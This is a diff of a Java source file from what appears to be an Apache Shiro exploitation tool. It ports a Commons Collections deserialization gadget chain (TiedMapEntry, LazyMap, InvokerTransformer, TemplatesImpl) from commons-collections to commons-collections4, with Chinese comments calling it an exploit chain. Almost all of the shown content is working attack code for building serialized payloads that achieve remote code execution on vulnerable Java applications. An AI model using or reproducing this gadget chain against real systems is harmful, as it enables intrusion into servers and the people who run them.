@@ -5,26 +5,25 @@ import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
 import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
 import com.y5neko.shiroexp.misc.Tools;
 import javassist.*;
-import org.apache.commons.collections.Transformer;
-import org.apache.commons.collections.functors.ConstantTransformer;
-import org.apache.commons.collections.functors.InvokerTransformer;
-import org.apache.commons.collections.keyvalue.TiedMapEntry;
-import org.apache.commons.collections.map.LazyMap;
+import org.apache.commons.collections4.Transformer;
+import org.apache.commons.collections4.functors.InvokerTransformer;
+import org.apache.commons.collections4.keyvalue.TiedMapEntry;
+import org.apache.commons.collections4.map.LazyMap;
 
 import java.io.ByteArrayOutputStream;
 import java.io.IOException;
 import java.io.ObjectOutputStream;
-import java.lang.reflect.Constructor;
 import java.lang.reflect.Field;
 import java.util.Base64;
 import java.util.HashMap;
 import java.util.Map;
 
 /**
- * CommonsCollectionsK1 利用链
- * 使用 TiedMapEntry + LazyMap + InvokerTransformer 组合
+ * CommonsCollectionsK2 利用链
+ * 使用 commons-collections4 包
+ * TiedMapEntry + LazyMap + InvokerTransformer 组合
  */
-public class CommonsCollectionsK1 {
+public class CommonsCollectionsK2 {
 
     /**
      * 反射设置字段值
@@ -82,16 +81,16 @@ public class CommonsCollectionsK1 {
         setFieldValue(templates, "_name", "a");
         setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());
 
-        // CCK1 利用链核心
+        // CCK2 利用链核心 (使用 commons-collections4)
         // 1. 创建初始 InvokerTransformer (方法名为 toString，后续会反射修改为 newTransformer)
         InvokerTransformer transformer = new InvokerTransformer("toString", new Class[0], new Object[0]);
 
-        // 2. 创建 LazyMap，绑定 InvokerTransformer
+        // 2. 创建 LazyMap (注意：commons-collections4 使用 LazyMap.lazyMap 静态方法)
         HashMap<String, String> innerMap = new HashMap<>();
-        Map lazyMap = LazyMap.decorate(innerMap, (Transformer) transformer);
+        Map lazyMap = LazyMap.lazyMap(innerMap, (Transformer) transformer);
 
         // 3. 创建 TiedMapEntry，绑定 LazyMap 和 TemplatesImpl
-        TiedMapEntry tied = new TiedMapEntry(lazyMap, templates);
+        TiedMapEntry tied = new TiedMapEntry((Map) lazyMap, templates);
 
         // 4. 创建 outer HashMap，将 TiedMapEntry 作为 key 放入
         Map<Object, Object> outerMap = new HashMap<>();
@@ -141,13 +140,13 @@ public class CommonsCollectionsK1 {
         setFieldValue(templates, "_name", "a");
         setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());
 
-        // CCK1 利用链核心
+        // CCK2 利用链核心 (使用 commons-collections4)
         InvokerTransformer transformer = new InvokerTransformer("toString", new Class[0], new Object[0]);
 
         HashMap<String, String> innerMap = new HashMap<>();
-        Map lazyMap = LazyMap.decorate(innerMap, (Transformer) transformer);
+        Map lazyMap = LazyMap.lazyMap(innerMap, (Transformer) transformer);
 
-        TiedMapEntry tied = new TiedMapEntry(lazyMap, templates);
+        TiedMapEntry tied = new TiedMapEntry((Map) lazyMap, templates);
 
         Map<Object, Object> outerMap = new HashMap<>();
         outerMap.put(tied, "t");
